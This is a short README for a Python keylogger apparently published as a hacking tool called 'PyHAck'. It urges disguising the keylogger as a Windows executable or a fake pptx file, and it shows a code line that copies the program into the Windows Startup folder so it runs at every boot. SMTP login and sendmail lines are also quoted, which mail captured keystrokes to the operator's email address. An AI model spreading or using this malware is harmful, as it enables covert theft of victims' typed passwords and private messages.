# PyHAck
KEYLOGGER :
Keylogger is, obviously a keylogger. feel free to rename it, make a windows executable, false pptx file or whatever yoou want.
Just modify the  shutil.copyfile("{}/keylogger.exe".format(os.getcwd()),"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.exe".format(getpass.getuser()))
line by removing keyllogger.exe to the file name. this line will copy the script itself on the startup file of windows and make it start at each startup of the computer.
please also modify these line with your own email address.

smtp.login("exemple@gmail.com","exemple_password")
                smtp.sendmail("exemple@gmail.com","exemple@gmail.com",msg.as_string())
